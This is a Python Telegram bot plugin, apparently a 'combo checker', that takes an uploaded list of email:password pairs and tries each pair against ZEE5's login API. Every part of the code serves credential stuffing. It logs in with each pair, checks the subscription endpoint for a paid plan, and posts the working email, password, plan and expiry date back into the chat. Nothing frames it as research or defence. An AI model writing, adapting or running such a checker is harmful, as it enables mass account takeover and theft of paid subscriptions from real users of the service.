import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
# import bs4
from pyrogram import Client, filters
import json

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def isVip(r,token):
    url='https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true'
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'Authorization': 'Bearer '+token,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
        }
    re = r.get(url, headers=headers)
    return re

def count_lines(filename):
    with open(filename, 'r') as f:
        return len(f.readlines())

@Client.on_message(filters.command(["zee", "make"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def gen(Client , message):
    try:
        if message.reply_to_message:
            if message.reply_to_message.document:
                if message.reply_to_message.document.file_name.endswith(".txt"):
                    await message.reply_to_message.download("accounts.txt")
                    msg = await message.reply_text("Downloading file...")
                    with open("downloads/accounts.txt", "r") as f:
                        le = count_lines("downloads/accounts.txt")
                        hits = 0
                        fails = 0
                        free = 0
                        for i, line in enumerate(f, start=1):
                            if not line.strip():
                                break
                            else:
                                email,password = line.split(":")
                                password = password.strip()
                                email = email.strip()
                                print(email+":"+password)
                                r = requests.session()
                                req = r.post('https://userapi.zee5.com/v2/user/loginemail',json={"email": email, "password": password})
                                token = find_between(req.text, '"access_token":"', '"')
                                if (req.status_code == 401):
                                    fails += 1
                                    print("Invalid credentials")
                                elif (req.status_code == 200):
                                    if (isVip(r,token)):
                                        r = isVip(r,token).json()
                                        if(r == []):
                                            free += 1
                                            print("Free")
                                        else:
                                            plan = find_between(str(r), "original_title': '", "'")
                                            exp = find_between(str(r), "end': '", "'")
                                            days = find_between(str(r), "billing_frequency':", ",")
                                            hits += 1
                                            await message.reply_text(f"<b>Email: <code>{email}</code>\nPassword: <code>{password}</code>\nPlan: <code>{plan}</code>\nExp: <code>{exp}</code>\nDays: <code>{days}</code></b>", parse_mode="html")
                                else:
                                    print("Unknown error")
                                    print(r.status_code)
                                msg = await msg.edit(f"<b>Combo Length: {le}\nChecking.. {i}/{le}| Hits: {hits}|Free: {free}|Fails: {fails}</b>")
                    await message.reply_text("Checking Completed")
                    # close file
                    f.close()
                    #edit message
                else:
                    await message.reply_text("Please reply to a .txt file")
    except Exception as e:
        print(e)
